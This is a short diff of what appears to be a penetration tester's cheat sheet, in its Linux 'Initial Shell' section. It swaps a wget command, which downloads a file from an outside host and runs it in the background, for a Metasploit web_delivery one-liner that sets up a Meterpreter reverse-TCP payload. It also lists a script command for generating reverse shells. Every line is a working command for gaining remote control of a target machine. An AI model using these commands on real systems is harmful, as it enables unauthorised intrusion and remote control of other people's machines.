@@ -1162,7 +1162,7 @@ sekurlsa::dpapi
 ## Linux
 [*] Initial Shell
 +---------- Web Delivery (Linux Meterpreter) ----------+
-wget -qO ovuP6Z9D --no-check-certificate http://10.10.14.4:8888/bAByMUXNl; chmod +x ovuP6Z9D; ./ovuP6Z9D& disown
+msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SRVPORT 8888; setg LHOST $MYIP; setg LPORT 443; set TARGET Linux; setg PAYLOAD linux/x64/meterpreter/reverse_tcp; run'
 
 +---------- Generate resh ----------+
 resh.py $MYIP 80 /Upload/resh; resh.py $MYIP 80 /Upload/resh_5566
